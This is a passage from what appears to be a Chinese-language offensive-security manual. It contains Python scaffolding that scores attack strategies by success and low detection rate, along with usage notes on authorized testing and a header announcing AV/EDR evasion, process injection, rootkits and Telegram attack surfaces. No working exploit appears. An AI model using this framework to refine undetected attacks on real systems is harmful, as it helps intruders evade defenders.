                '安全组规则',
                '日志和监控配置',
                '加密配置 (静态/传输)',
            ],
        }
        
        results = {}
        for category, checks in audit_checks.items():
            results[category] = {}
            for check in checks:
                results[category][check] = await self.execute_check(target, check)
        
        return results
```

### 50.3 自适应对抗学习

```python
class AdaptiveAdversarialLearning:
    """自适应对抗学习 — 从失败中学习并改进攻击策略"""
    
    def __init__(self):
        self.history = []  # 攻击历史
        self.strategy_scores = {}  # 策略效果评分
        self.model = self.load_model()
    
    async def learn_from_campaign(self, campaign_result):
        """从攻击活动中学习"""
        
        for step in campaign_result['steps']:
            self.history.append({
                'target_type': step['target_type'],
                'strategy': step['strategy'],
                'success': step['success'],
                'detection': step.get('detected', False),
                'duration': step['duration'],
                'environment': step['environment'],
            })
        
        # 更新策略评分
        self.update_strategy_scores()
        
        # 训练改进模型
        if len(self.history) > 100:
            self.model = self.retrain_model()
    
    def select_optimal_strategy(self, target_profile):
        """基于历史数据选择最优策略"""
        
        # 找到与当前目标最相似的历史目标
        similar_targets = self.find_similar_targets(target_profile)
        
        # 从相似目标的成功策略中选择
        best_strategies = []
        for target in similar_targets:
            strategies = self.get_successful_strategies(target)
            best_strategies.extend(strategies)
        
        # 按成功率排序
        ranked = sorted(best_strategies, key=lambda s: s['success_rate'], reverse=True)
        
        return ranked[0] if ranked else self.get_default_strategy()
    
    def update_strategy_scores(self):
        """更新所有策略的效果评分"""
        
        strategy_stats = {}
        for record in self.history:
            strategy = record['strategy']
            if strategy not in strategy_stats:
                strategy_stats[strategy] = {'success': 0, 'total': 0, 'detected': 0}
            
            strategy_stats[strategy]['total'] += 1
            if record['success']:
                strategy_stats[strategy]['success'] += 1
            if record['detection']:
                strategy_stats[strategy]['detected'] += 1
        
        for strategy, stats in strategy_stats.items():
            success_rate = stats['success'] / stats['total'] if stats['total'] > 0 else 0
            detection_rate = stats['detected'] / stats['total'] if stats['total'] > 0 else 0
            
            # 综合评分: 成功率 - 0.5 * 检测率
            score = success_rate - 0.5 * detection_rate
            self.strategy_scores[strategy] = score
```

---


## §51. 注意事项

1. **授权要求**: 本技能集仅供授权安全测试使用，未经授权禁止对任何目标使用
2. **法律合规**: 所有操作须遵守当地法律法规，跨境操作需特别注意OFAC等制裁合规
3. **环境隔离**: 免杀载荷生成须在隔离环境中进行，避免误泄露
4. **EDR演进**: 杀软/EDR检测能力持续更新，绕过策略需定期验证
5. **Telegram ToS**: Telegram Bot开发须遵守Telegram Terms of Service
6. **CDN滥用**: CDN溯源技术不得用于DDoS或其他恶意目的
7. **区块链风险**: TON相关操作涉及不可逆资金流转，须格外谨慎
8. **AI安全**: LLM Bot测试须确保不泄露用户隐私数据

---

# Part VII: 三域深度强化 (v1.5 新增)

> 2026-07-23 第五轮深度强化 — 域A(跨平台全端免杀+浏览器载荷+高级进程注入+驱动Rootkit+新一代Loader) + 域B(高级溯源扩展: WebSocket/HTTP3/DoH/实时DNS/新增CDN厂商) + 域C(Telegram 2026新攻击面: Stars/Gateway/Premium/iframe沙箱/Fragment/Passport/Channels)

---

